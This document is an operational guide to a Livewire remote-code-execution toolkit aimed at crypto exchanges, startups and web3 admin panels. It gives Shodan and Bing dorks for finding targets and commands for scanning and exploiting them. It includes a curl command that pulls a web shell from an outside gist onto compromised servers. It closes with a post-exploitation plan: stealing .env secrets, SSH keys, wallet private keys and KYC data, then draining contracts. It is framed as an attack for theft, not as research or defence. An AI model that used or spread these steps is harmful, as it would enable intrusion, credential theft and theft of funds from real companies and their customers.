# Laravel Livewire RCE — Auto-Exploitation Toolkit

## Target Profile
Laravel apps running Livewire version <3.6.4. Vulnerable to RCE through `wire:snapshot` parameter.
PHP deserialization chain: `BroadcastEvent → PendingBroadcast → Validator.extensions[""] → system()`.

**IMPORTANT: DeFi frontends (React/Next.js) rarely use Livewire. Target traditional crypto startups, exchanges, admin panels, and web3 dashboards that use PHP/Laravel.**

## Attack Chain
1. Dork for Laravel Livewire URLs
2. Scan: check Livewire version <3.6.4 + `wire:snapshot` in HTML
3. Exploit: inject PHP gadget chain via wire:snapshot → RCE
4. Upload shell OR extract env data directly

## Toolkit Location
`/tmp/rce-auto/RCE AUTO DORK & AUTO EXPLOIT/`

### Files
- `main.py` — menu UI: dork / check / exploit / full auto
- `autodork.py` — Shodan dork (NOT Google — uses `api.shodan.io` + facet scraper)
- `checker.py` — threaded scanner: reads list.txt, calls `inti.py -c`, outputs valid.txt
- `upshell.py` — mass exploit from valid.txt → shells.txt
- `inti.py` — single-target: `python3 inti.py -u <url> -f system -p "id"`
- `single-upload.py` — fast single-target with custom payload
- `exploit/exploit.py` — core Livewire check (version, snapshot, CSRf, update URI)
- `exploit/exploit_appkey.py` — RCE with known APP_KEY (signed snapshot + checksum)
- `exploit/exploit_wappkey.py` — RCE without APP_KEY (forced/unsafe mode)
- `exploit/laravel_crypto/` — encrypt/decrypt for APP_KEY attacks
- `list.txt` — input targets
- `valid.txt` — vulnerable targets output
- `shells.txt` — shells output
- `requirements.txt` — requests, bs4, rich

### Setup
```bash
python3 -m venv /tmp/venv
source /tmp/venv/bin/activate
pip install requests bs4 beautifulsoup4 rich
```

### Dork Types (autodork.py Shodan)
1. `html:"wire:effects"` — Perawan
2. `http.html:"livewire"` — Janda (recommended, broadest)
3. `html:"wire:id"` — Duda
4. `html:"wire:snapshot"` — Jomblo

**Shodan free mode facet scraper broken as of 2026** — returns empty results. Need Shodan API key.
Without API key, must supply target list manually (Google/Bing dork via curl, or known crypto web3 domain list).

### Manual Dork (no Shodan)
```bash
curl -sL "https://www.bing.com/search?q=%22livewire%22+site%3A.io&count=50" -H "User-Agent: Mozilla/5.0" \
  | grep -oP 'https?://[^"]*' | grep -v bing | sort -u > list.txt
```

### Scan
```bash
python3 checker.py -l list.txt -o valid.txt
```

### Exploit Single Target
```bash
# Check only
python3 inti.py -u https://target.com -c

# RCE
python3 inti.py -u https://target.com -f system -p "id"
python3 inti.py -u https://target.com -f system -p "ls -la"

# Upload shell
python3 single-upload.py -u https://target.com -f system \
  -p "curl -sL https://gist.githubusercontent.com/anon1137/.../bypass.txt -o environtment.php"
```

### Shell Access
After upload: `https://target.com/environtment.php`

## Pitfalls (from wajib_dibaca.txt + session experience)

### Shell upload fails
- **E-Root**: filesystem read-only → shell can't persist
- **PHP disabled**: `system`/`exec` blocked → try alternative functions or skip to data extraction
- **Docker/Serverless**: ephemeral — shell auto-deleted, extract `.env` immediately
- **Solution**: extract DB creds / API keys from env instead of uploading shell

### Dork failure
- Shodan free facet scraper broken 2026 — no results returned
- **Solution**: supply manual target list or use Google/Bing dork directly

### No Livewire on DeFi frontends
- Most crypto apps use React/Next.js/Vue — NOT Laravel
- Target instead: crypto startup landing pages, exchange admin panels, NFT marketplaces built with PHP
- Common pattern: Laravel backend + React frontend = Livewire admin panel still present

## Post-Exploitation Priority
1. `.env` — APP_KEY (decrypt all cookies/sessions), DB creds, AWS keys, wallet PKs
2. `~/.ssh/`, `/root/`, `/var/www/html/` — SSH keys, other env files
3. Database — user wallets, balances, KYC, admin tokens
4. Source code — custom Solidity integration, private business logic
5. On-chain escalation — extracted PKs → drain contracts
